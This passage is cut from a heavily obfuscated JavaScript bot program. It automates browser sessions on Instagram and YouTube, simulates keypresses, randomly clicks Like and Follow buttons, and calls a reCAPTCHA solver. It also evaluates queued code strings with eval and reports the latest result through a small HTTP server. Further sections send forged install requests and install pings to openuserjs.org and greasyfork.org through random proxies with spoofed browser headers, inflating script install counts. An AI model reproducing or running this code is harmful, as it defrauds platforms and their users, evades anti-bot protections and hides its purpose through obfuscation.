                    const ad = a2[-0x1 * 0xc2d + 0x1f3d + -0x1310];
                    Check['ia'](ad, Page, Frame),
                    await Z['solveRecap' + 'tchaV2'](ad);
                  }
                  break;
                case 'sclick':
                  {
                    const ae = a2['shift'](),
                      af = a2['shift']();
                    (ae instanceof Page || ae instanceof Frame) && 'string' == typeof af && isValidPruneArray(a2) || warn('[WATCHDOG]' + '\x20arg\x20check' + '\x20failed\x20in' + '\x20sclick:', a2),
                    await K(Z, [
                      'stype',
                      '_click',
                      ae,
                      af,
                      ...a2
                    ]);
                  }
                  break;
                case 'sclick-nav':
                  {
                    const [ag] = a2;
                    Check['ia'](ag, Page, Frame);
                    const ah = ag['waitForNav' + 'igation']();
                    await K(Z, [
                      'sclick',
                      ...a2
                    ]),
                    await ah;
                  }
                  break;
                case 'view':
                  {
                    const ai = a2['shift'](),
                      aj = a2['shift']();
                    (ai instanceof Page || ai instanceof Frame) && 'string' == typeof aj && isValidPruneArray(a2) || warn('[WATCHDOG]' + '\x20arg\x20check' + '\x20failed\x20in' + '\x20view:', a2),
                    await K(Z, [
                      'stype',
                      '_view',
                      ai,
                      aj,
                      ...a2
                    ]);
                  }
                  break;
                case 'randomdown':
                  {
                    let [ak, al] = a2;
                    Check['num'](ak),
                    Check['num'](al),
                    al ? ? = 0x1 * 0x15a7 + 0xcde + 0x1 * -0x2285 + 0.3;
                    for (let am = ak; am-- && (await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('ArrowDown'), !(random() <= al));)
                      await H();
                  }
                  break;
                case 'enter-nav':
                  {
                    const [an] = a2;
                    Check['ia'](an, Page, Frame);
                    const ao = an['waitForNav' + 'igation']();
                    await K(Z, 'enter'),
                    await ao;
                  }
                  break;
                case 'click':
                  {
                    const [ap, aq, ar] = a2;
                    if ('string' != typeof ap || ![
                        'boolean',
                        'string'
                      ]['includes'](typeof aq) || !(ar instanceof Page || ar instanceof Frame))
                      return void warn('[WATCHDOG]' + '\x20Failed\x20ar' + 'gument\x20che' + 'ck', a2);
                    await Z['clickSelec' + 'tor'](ap, aq, ar);
                  }
                  break;
                case 'ifclick':
                  {
                    const [as, au, av] = a2;
                    'string' == typeof as && [
                      'boolean',
                      'string'
                    ]['includes'](au) && (av instanceof Page || av instanceof Frame) || warn('[WATCHDOG]' + '\x20Failed\x20ar' + 'gument\x20che' + 'ck', a2);
                    let aw = await av['$'](as);
                    aw && await Z['clickSelec' + 'tor'](as, au, av);
                    try {
                      aw ? .['dispose'] ? .();
                    } catch (ax) {}
                  }
                  break;
                default:
                  warn('No\x20action\x20' + 'found\x20for\x20' + a1[0x2b * -0x73 + -0x333 + 0x1684]);
              }
            } else {
              const ay = a1['split'](',\x20');
              await H(), flags['debug'] && log('[DEBUG]\x20Ex' + 'ecuting\x20sc' + 'riptlet\x20ty' + 'pe:', ay);
              let az = -0x25b1 + 0xffc + 0x15b5;
              for (let aA of ay) {
                switch (flags['debug'] && log('[SNIP' + az++ + (']\x20Executin' + 'g\x20step:\x20[') + aA + ']'), aA) {
                  case 'j':
                    await H();
                    break;
                  case 'tab':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('Tab');
                    break;
                  case 'enter':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('Enter');
                    break;
                  case 'down':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('ArrowDown');
                    break;
                  case 'up':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('ArrowUp');
                    break;
                  case 'space':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('Space');
                    break;
                  case 'esc':
                  case 'escape':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('Escape');
                    break;
                  default:
                    warn('[WATCHDOG]' + '\x20Failed\x20cm' + 'd\x20catch', aA, ay);
                }
                await H();
              }
            }
          return 0x2402 + -0x20f6 + -0x29 * 0x13;
        }
        async function L(Z) {
          return Check['inst'](Z, Page), await Z['keyboard']['down']('ArrowDown'), await wait(getRandomInt(0x255a + 0x6fb * 0x4 + 0x432 * -0xf, 0x41 * -0x1e + -0x1 * 0x14bd + 0x26e7)), await Z['keyboard']['up']('ArrowDown'), await wait(getRandomInt(0xab5 * 0x2 + -0x5 * 0x1bb + -0x8db, 0xbc4 + 0xd * 0x181 + 0x1 * -0xdbd)), -0x6be + 0x866 + -0x1a7;
        }
        let M = 0x120b * -0x2 + 0x13a1 * 0x1 + 0x1 * 0x1075;

        function N(Z = 'none') {
          return 'sadjqwdwkq' + 'dwqxzc' + sha1(++M + ('sadjqwdwkq' + 'dwq') + Z);
        }
        async function O(Z, a0) {
          Check['func'](Z), Check['inst'](a0, Page);
          const a1 = N();
          await a0['evaluate'](a2 => {
            let a3 = [...document['querySelec' + 'torAll']('svg')]['find'](a4 => a4['innerHTML']['includes']('<title>Lik' + 'e</title>') && 'Like' === a4['getAttribu' + 'te']('aria-label') && window['__toolkit']['smartEleme' + 'ntVisible'](a4));
            a3 && a3['classList']['add'](a2);
          }, a1), await Z(a0['browser'](), [
            'ifclick',
            '.' + a1,
            0x2343 * 0x1 + -0xd * -0x1e7 + -0x3bfd * 0x1,
            a0
          ]);
        }
        async function P(Z, a0) {
          const a1 = N();
          await a0['evaluate'](a2 => {
            let a3 = [...document['querySelec' + 'torAll']('div')]['find'](a5 => 'Follow' === a5['innerText'] && window['__toolkit']['smartEleme' + 'ntVisible'](a5)),
              a4 = a3['className']['baseVal'];
            a3['className']['baseVal'] += ('' === a4 ? '' : '\x20') + a2;
          }, a1), await Z(a0['browser'](), [
            'ifclick',
            '.' + a1, -0x1 * -0x1a30 + -0x2 * -0x98 + 0x27d * -0xb,
            a0
          ]);
        }
        async function Q(Z) {
          await Z['goto']('https://ww' + 'w.instagra' + 'm.com/', gotoOpts), await Z['waitForFun' + 'ction'](() => {
            try {
              return document['querySelec' + 'torAll']('article')['length'] > 0x2 * 0x63a + -0x1403 + 0x790;
            } catch (a0) {
              return 0x128c + -0x2481 * -0x1 + -0x1 * 0x370d;
            }
          });
        }
        async function R(Z) {
          await Z['keyboard']['down']('ArrowDown'), await wait(getRandomInt(0x1152 + 0x2 * -0x1223 + -0x154c * -0x1, 0xd * 0x1bb + -0x586 + -0x66d)), await Z['keyboard']['up']('ArrowDown'), await wait(getRandomInt(-0x65f * -0x1 + -0x3 * -0x3d + -0x16 * 0x25, 0x1e27 + -0x4dc * -0x4 + 0x1 * -0x2003)), getRandomInt(0x20d8 + 0x132c + -0x1 * 0x3403, 0x2 * 0x1283 + -0x18e3 + 0x1 * -0xc19) <= 0x529 * -0x1 + -0x13 * -0x2 + 0x3 * 0x1ae && await O(K, Z), getRandomInt(-0x40 + 0x6b5 * 0x2 + -0xd29, -0xc33 * 0x1 + 0x2b * 0xcb + 0x1582 * -0x1) <= 0x1 * 0x2309 + -0x1693 * -0x1 + 0x3979 * -0x1 && await P(K, Z);
        }
        async function S(Z) {
          return await Z['evaluate'](() => {
            window['__toolkit'] = {
              'isElementVisible' (a0) {
                try {
                  return null !== a0['offsetPare' + 'nt'];
                } catch (a1) {
                  return 0xfad + -0xa38 * -0x2 + -0x241d;
                }
              },
              'smartElementVisible' (a0) {
                try {
                  if (!a0 || !a0['getClientR' + 'ects']()['length'])
                    return -0x17 * 0x124 + -0x2 * 0x263 + 0x1f02;
                  const a1 = getComputedStyle(a0);
                  if ('none' === a1['display'] || 'hidden' === a1['visibility'] || '0' === a1['opacity'])
                    return 0x4 * 0x19f + 0x4b8 + 0x2 * -0x59a;
                  const a2 = a0['getBoundin' + 'gClientRec' + 't']();
                  return a2['top'] >= 0x1 * -0x10af + 0x106 * 0xb + -0x56d * -0x1 && a2['left'] >= 0xed8 + 0x16b7 + -0x258f && a2['bottom'] <= (window['innerHeigh' + 't'] || document['documentEl' + 'ement']['clientHeig' + 'ht']) && a2['right'] <= (window['innerWidth'] || document['documentEl' + 'ement']['clientWidt' + 'h']) ? 0x28 * 0xc6 + 0x22b0 + 0x9d * -0x6b : 0x1 * 0x28f + -0x3 * 0xaa9 + 0x1d6c;
                } catch (a3) {
                  return 0x4 * 0x7e7 + 0xd * 0x197 + 0x5cf * -0x9;
                }
              },
              'extractLinks' (a0) {
                const a1 = /<a\s+(?:[^>]*?\s+)?href="([^"]*)"/gi;
                let a2, a3 = [];
                for (; null !== (a2 = a1['exec'](a0));)
                  a2['index'] === a1['lastIndex'] && a1['lastIndex']++, a2['forEach']((a4, a5) => {
                    -0x21ab + 0x1 * -0xc61 + 0x2e0d === a5 && a3['push'](a4);
                  });
                return a3;
              }
            };
          });
        }
        log('browser\x20la' + 'unched');
        let T = 0x2 * 0x41a + 0x87 * -0x2 + -0x726;
        const U = V['length'],
          V = [
            async function() {
              const Z = await x('https://ww' + 'w.youtube.' + 'com/');
              let a0 = 0x1dd3 + 0xa33 + -0x2f * 0xda;
              if (await Z['goto'](data['mediumArti' + 'cles']['random'](), {
                  'timeout': NETWORK_PATIENCE
                })['catch'](a1 => a0++), !a0) {
                await randomWait();
                for (let a1 = -0x11 * -0x90 + 0x1 * 0x11bc + -0x1b4c; a1 < getRandomInt(-0x33b * 0x1 + -0xd81 * 0x1 + -0x1 * -0x10bd, 0x205b + -0x3 * -0x822 + -0x1 * 0x38bc); a1++)
                  await q['simKeyboar' + 'dPress']('ArrowDown'), await randomWait();
                await randomWait(), await wait(-0x1d391 + -0x19d5e + 0x55cb * 0xd), await Z['close']();
              }
            },
            async function() {
              const aM = c,
                Z = await x('https://ww' + 'w.youtube.' + 'com/');
              let a0 = -0x17e3 + -0xe7c * 0x2 + 0x34db;
              const a1 = getRandomInt(-0x24f3 + 0x2cf + 0x2229, -0x1 * -0x23e4 + -0x15a9 + 0x1 * -0xe2e);
              for (; a0 < a1;) {
                try {
                  await y(Z), await G['random']()(Z);
                } catch (a2) {
                  log(a2), await Z['goto']('https://ww' + aM(0x1c) + 'com/');
                }
                a0++;
              }
              return await Z['close'](), -0x2e1 * 0x1 + -0x10 * -0x2e + 0x2 * 0x1;
            }
          ];
        for (;;) {
          try {
            const Z = f['length'] ? f['shift']() : V[T++ % U];
            'string' == typeof Z ? g = await eval(Z) : await Z();
          } catch (a0) {}
          await wait(0xdfe + -0x2be + -0x758);
        }
      }
      if (flags['doCreateSe' + 'rver'] && require('http')['createServ' + 'er'](async function(a1, a2) {
          '/latestev' === a1['url'] ? (a2['writeHead'](0xd5d + -0x1dec + -0xc1 * -0x17), a2['end']('$' === g ? g : '$' + g)) : (a2['writeHead'](0x7ee + 0x7f * 0x4 + -0x2 * 0x491), a2['write']('v0.8'), a2['end']());
        })['listen'](process['env']['PORT'] || -0x3bf + 0xd51 * -0x4 + 0x38b * 0x19), flags['doOUJS']) {
        const a1 = 'https://op' + 'enuserjs.o' + 'rg/';

        function a2(a5, a6 = 0x7 * -0x157 + 0xa26 + -0x1c * 0x7) {
          if (a5['includes']('Firefox'))
            return a5['slice'](a5['indexOf']('Firefox') + 'Firefox' ['length'] + (-0xd6b + 0x228 * 0x12 + -0x1964));
          const a7 = a5['indexOf']('Chrome/') + 'Chrome/' ['length'],
            a8 = a5['slice'](a7),
            a9 = a8['slice'](-0x3a8 * 0x1 + -0x943 + 0xceb, a8['indexOf']('\x20'));
          return a6 ? a9['slice'](0x1 * 0x215 + 0xc5 * 0x17 + -0x13c8, a9['indexOf']('.')) : a9;
        }

        function a3() {
          const a5 = data['oujsUAs']['random']();
          return [
            a5,
            a5['includes']('Firefox')
          ];
        }
        async function a4() {
          const aO = d,
            aN = b,
            a5 = data['oujsToAssi' + 'st']['random'](),
            a6 = a5['replace']('/scripts/', '/install/') + '.user.js',
            [a7, a8] = a3(),
            a9 = a2(a7),
            aa = {
              'signal': AbortSignal['timeout'](0x38bc + -0x2efd + 0x5f * 0x4f),
              'headers': {
                'host': 'openuserjs' + '.org',
                'origin': 'https://op' + 'enuserjs.o' + 'rg',
                'user-agent': a7,
                'accept': 'text/html,' + aN(0x0, 'A6f#') + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
                'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
                'accept-language': 'en-US,en;q' + '=0.9',
                'cache-control': 'no-cache',
                'pragma': 'no-cache',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origi' + 'n',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1'
              },
              'body': null,
              'method': 'GET'
            };
          a8 ? Object['assign'](aa['headers'], {
            'te': 'trailers'
          }) : Object['assign'](aa['headers'], {
            'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + aO(0x19) + 'm\x22;v=\x22' + a9 + '\x22',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\x22Windows\x22'
          });
          const ab = await fetch(a1, aa)['catch'](ae => {});
          if (!ab || !ab['headers'])
            return;
          if (null === ab['headers']['get']('X-RateLimi' + 't-Limit'))
            return;
          const ac = {
            'signal': AbortSignal['timeout'](0x1742 + -0x1 * 0x3949 + -0x3f * -0x129),
            'headers': {
              'host': 'openuserjs' + '.org',
              'origin': 'https://op' + 'enuserjs.o' + 'rg',
              'user-agent': a7,
              'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
              'accept-encoding': 'gzip,\x20defl' + aO(0x3),
              'accept-language': 'en-US,en;q' + '=0.9',
              'cache-control': 'no-cache',
              'pragma': 'no-cache',
              'referer': a1,
              'sec-fetch-dest': 'document',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-site': 'same-origi' + 'n',
              'sec-fetch-user': '?1',
              'upgrade-insecure-requests': '1'
            },
            'body': null,
            'method': 'GET'
          };
          if (a8 ? Object['assign'](ac['headers'], {
              'te': 'trailers'
            }) : Object['assign'](ac['headers'], {
              'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + a9 + '\x22',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-platform': '\x22Windows\x22'
            }), !await fetch(a5, ac)['catch'](ae => {}))
            return;
          const ad = {
            'headers': {
              'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
              'accept-language': 'en-US,en;q' + '=0.9',
              'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
              'pragma': 'no-cache',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'none'
            },
            'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
            'body': null,
            'method': 'GET'
          };
          a8 ? Object['assign'](ad['headers'], {
            'te': 'trailers'
          }) : Object['assign'](ad['headers'], {
            'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + a9 + '\x22',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\x22Windows\x22'
          }), await fetch(a6, ad);
        }
        a4();
        for (let a5 = -0x1a7 + -0x2204 + 0x23ab * 0x1; a5 < -0x41 * -0x1 + -0x1c3b + 0x1bfe; a5++)
          setTimeout(a4, (0x409 * -0x19 + 0x1558c * -0x1 + 0x33d * 0xd1) * a5 * getRandomInt(-0x13d1 + 0x19da * 0x1 + 0x304 * -0x2, 0x9dc * 0x2 + 0xca * 0xc + -0x1d2d));
        setInterval(() => {
          a4();
          for (let a6 = -0x1fde + 0x187f + 0x11 * 0x6f; a6 < 0x1 * -0x1b1f + 0x1 * -0xfc9 + 0x2aec; a6++)
            setTimeout(a4, (-0x1cf68 + 0xc3c4 + -0xb2 * -0x2d2) * a6 * getRandomInt(0x195d + 0x4 * 0x22a + -0x2204 * 0x1, 0x1996 + 0x245 * 0x4 + -0x22a7));
        }, -0x5b6baf + 0x875c0 + -0x81c7f * -0x11);
      }
      if (flags['doGF']) {
        async function a6(a8 = null, a9 = -0x1fc5 + 0x2 * -0xeb1 + 0x3d27) {
          const aP = b,
            aa = makeFetchCookie(fetch),
            ab = a8 ? new HttpsProxyAgent(a8) : a8,
            ac = await aa('https://gr' + 'easyfork.o' + 'rg/en', {
              'credentials': 'include',
              'headers': {
                'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
                'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
                'Accept-Language': 'en-US,en;q' + '=0.5',
                'Prefer': 'safe',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site'
              },
              'method': 'GET',
              'mode': 'cors',
              'agent': ab
            }),
            ad = extractLinks(await ac['text']())['filter'](al => al['includes']('by-site'))['slice'](0xd6b + -0x170c + 0x91 * 0x11, -(-0x1 * -0x2663 + 0x13bd + -0x3a1f)),
            ae = a9 && data['scriptTarg' + 'ets']['random'](),
            af = a9 ? ae['preRef'] : ad['random'](),
            ag = await aa(af, {
              'credentials': 'include',
              'headers': {
                'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + aP(0x18, '%EQO') + 'o/20100101' + '\x20Firefox/1' + '20.0',
                'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
                'Accept-Language': 'en-US,en;q' + '=0.5',
                'Prefer': 'safe',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origi' + 'n',
                'Sec-Fetch-User': '?1'
              },
              'referrer': 'https://gr' + 'easyfork.o' + 'rg/en',
              'method': 'GET',
              'mode': aP(0xc, 'Fs@0'),
              'agent': ab
            }),
            ah = extractLinks(await ag['text']())['filter'](al => al['includes']('/scripts/') && !al['includes']('by-site'))['slice'](-0xab + -0xa2 * 0x2f + 0x1e6a),
            ai = a9 ? ae['url'] : ah['random'](),
            aj = await aa(ai, {
              'credentials': 'include',
              'headers': {
                'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
                'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
                'Accept-Language': 'en-US,en;q' + '=0.5',
                'Prefer': 'safe',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origi' + 'n',
                'Sec-Fetch-User': '?1'
              },
              'referrer': af,
              'method': 'GET',
              'mode': 'cors',
              'agent': ab
            }),
            ak = extractAnchorData(await aj['text']());
          if (ak['pingUrl']) {
            const al = sha1(ak['ipAddress'] + ak['scriptId'] + ak['pingKey']),
              am = ak['pingUrl'] + (ak['pingUrl']['includes']('?') ? '&' : '?') + 'ping_key=' + encodeURIComponent(al);
            await aa('https://gr' + 'easyfork.o' + 'rg' + am + '&mo=3', {
              'credentials': 'include',
              'headers': {
                'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + aP(0x12, 'tG1w') + '\x20Firefox/1' + '20.0',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q' + '=0.5',
                'Prefer': 'safe',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origi' + 'n'
              },
              'referrer': ai,
              'method': 'POST',
              'mode': 'cors',
              'agent': ab
            });
          } else
            warn('awdiwajdwj' + 'qdqw');
        }
        async function a7() {
          const a8 = await getRandomProxy();
          await a6(a8, -0xa4 * -0x2c + 0x86e + -0xda * 0x2b), random() <= 0x409 * -0x1 + 0x3b8 * -0x2 + 0xb79 + 0.6 && await a6(a8, -0x31 * -0x4d + 0x1e * 0x45 + 0xfe * -0x17);
        }
        a7();
        for (let a8 = 0xc06 + 0x1dbe + 0x6c * -0x63; a8 < -0x1b73 + -0x42d * 0x3 + 0x27fe; a8++)
          setTimeout(a7, (-0x13fcb + 0x18514 + 0xd * 0xcb3) * a8 * getRandomInt(0x226d + 0x42b * -0x6 + -0x2 * 0x4b5, -0x69d * 0x1 + -0x1bcc + 0x226c));
        setInterval(() => {
          a7();
          for (let a9 = -0x1 * -0x1e9d + -0x2323 + -0x486 * -0x1; a9 < -0x17 * 0xe6 + 0xb91 * -0x3 + 0x3761; a9++)
            setTimeout(a7, (0x6a9d + 0xe4c0 + 0x67 * -0xfb) * a9 * getRandomInt(0xa2d + 0x934 + -0x1360, -0x696 + 0x1a7 * 0x3 + 0x1a4));
        }, -0x8f916d + 0x1d02721 * -0x1 + 0x3e03e0e);
      }
    } catch (a9) {
      warn(a9);
    }
    break;
  }
}();